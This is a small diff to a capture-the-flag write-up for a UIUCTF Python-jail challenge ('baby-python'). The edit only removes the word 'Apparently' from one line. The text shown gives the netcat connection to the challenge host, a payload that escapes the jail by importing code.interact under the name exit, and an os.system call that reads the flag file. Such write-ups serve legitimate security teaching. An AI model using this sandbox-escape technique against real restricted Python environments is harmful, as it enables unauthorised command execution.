@@ -10,7 +10,7 @@ nc baby-python.chal.uiuc.tf 1337
 I wasn't able to solve this challenge during the ctf, but found it pretty interesting. Apparently, there were a couple of ways to do this:
 
 ### Solution 1
-Apparently, the payload ```from code import interact as exit``` gives you a python terminal with which you can run:
+The payload ```from code import interact as exit``` gives you a python terminal with which you can run:
 ```
 import os
 os.system("cat /flag")
